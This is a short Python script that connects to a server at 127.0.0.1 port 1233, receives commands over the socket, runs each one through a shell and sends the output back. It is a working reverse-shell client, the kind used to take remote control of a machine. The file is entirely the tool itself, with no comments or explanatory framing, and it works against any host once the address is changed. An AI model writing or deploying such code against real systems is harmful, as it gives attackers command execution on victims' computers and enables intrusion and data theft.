import socket

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('127.0.0.1', 1233))
    
    print("[*] Connected to the server.")

    while True:
        try:
            command = client.recv(1024).decode('utf-8')
            
            if not command:
                print("[*] Server closed the connection.")
                break

            if command.lower() == 'exit':
                print("[*] Server requested to close the connection.")
                break
            
            result = execute_command(command)
            client.send(result.encode('utf-8'))

        except (ConnectionResetError, BrokenPipeError):
            print("[*] Connection to server lost.")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    client.close()

def execute_command(command):
    import subprocess
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Command failed: {e.output.decode('utf-8')}"

if __name__ == "__main__":
    connect_to_server()
